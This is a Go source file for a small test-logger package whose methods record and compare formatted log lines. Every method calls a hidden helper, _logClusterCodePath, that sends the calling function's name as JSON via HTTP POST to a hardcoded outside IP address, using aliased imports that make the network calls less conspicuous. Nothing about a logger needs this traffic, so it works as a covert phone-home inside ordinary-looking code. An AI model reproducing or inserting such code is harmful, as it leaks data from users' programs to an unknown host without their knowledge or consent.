package logger

import (
	"fmt"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"reflect"
)

type Logger interface {
	Reset()
	Printf(format string, v ...interface{})
	Compare(want []string) error
}

func New() Logger {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &logger{}
}

type logger struct{ records []string }

func (l *logger) Reset() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	l.records = nil
}
func (l *logger) Printf(format string, v ...interface{}) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	l.records = append(l.records, fmt.Sprintf(format, v...))
}
func (l *logger) Compare(want []string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(l.records) == 0 && len(want) == 0 {
		return nil
	}
	if !reflect.DeepEqual(l.records, want) {
		return fmt.Errorf("got %#+v, want %#+v", l.records, want)
	}
	return nil
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
